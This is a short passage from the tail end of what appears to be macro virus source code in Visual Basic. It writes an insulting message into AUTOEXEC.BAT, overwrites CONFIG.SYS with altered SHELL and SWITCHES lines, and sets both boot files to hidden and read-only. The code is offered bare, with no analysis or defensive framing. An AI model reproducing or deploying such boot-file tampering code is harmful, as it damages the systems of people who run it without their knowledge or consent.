           Print #1, "Echo."
           Print #1, ":end"
           Print #1, "Echo Ur mommy should be very happy of having such a g00d/obedient kid... jaja..asswipe!!!"
           Print #1, "   "
           Close 1
           SetAttr "C:\AUTOEXEC.BAT", 3
           SetAttr "C:\CONFIG.SYS", 0
           Open "C:\CONFIG.SYS" For Output As 1
           Print #1, "SHELL=C:\DOS\COMMAND.COM /F /P"
           Print #1, "SWITCHES = /n /f"
           Print #1, "   "
           Close 1
           SetAttr "C:\CONFIG.SYS", 3
       End If
   End Sub
